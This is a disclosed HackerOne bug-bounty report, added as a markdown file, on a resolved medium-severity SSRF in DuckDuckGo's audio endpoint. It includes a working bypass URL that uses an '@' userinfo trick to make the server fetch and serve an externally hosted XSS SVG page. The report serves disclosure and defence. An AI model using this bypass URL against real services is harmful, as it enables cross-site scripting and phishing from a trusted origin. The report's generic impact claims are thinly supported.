@@ -1,0 +1,49 @@
+# SSRF with bypass leads to client side hosting / vulnerabilities ( XSS and others )
+
+- Program: DuckDuckGo
+- Weakness / temuan: **Server-Side Request Forgery (SSRF)**
+- Severity: medium
+- State: resolved
+- Bounty: $500.00
+- Upvotes: 77
+- Submitted: 2026-01-23
+- Disclosed: 2026-09-17
+- Report: https://hackerone.com/reports/3522157
+
+## Writeup
+
+# Summary
+
+Hi team, your web app is vulnerable to SSRF.
+
+## Overview of the Vulnerability
+Server-side request forgery (SSRF) is a vulnerability that exploits the trust relationship between a server and an application, or other backend systems. An attacker can take advantage of this trust to forge server-side traffic and make HTTP requests to internal or external domains.
+
+## Business Impact
+
+SSRF can lead to data theft and through an attacker accessing, deleting, or modifying data from within the application via their access to server-side systems. This could also result in reputational damage for the business through the impact to customers’ trust. The severity of the impact to the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.
+
+## Steps to Reproduce
+
+1. Enable a HTTP interception proxy, such as Burp Suite or OWASP ZAP
+2. Use a browser to login and navigate to: `https://start.duckduckgo.com/audio/?u=https:%2f%2faudio.wordnik.com%40raw.githubusercontent.com/ferreiraklet/xss-svg/refs/heads/main/index.html`
+3. See the server makes request to the url passed after @, fetchs it's resources and brings it to the website's front-end.
+
+```
+https://start.duckduckgo.com/audio/?u=https:%2f%2faudio.wordnik.com%40raw.githubusercontent.com/ferreiraklet/xss-svg/refs/heads/main/index.html
+``` 
+
+4. Observe the sensitive response
+
+## Proof of Concept (PoC)
+
+The screenshot below shows the full exploit:
+
+{F5266310}
+
+## Impact
+
+SSRF
+
+Interactsh ->
+{F5266319}
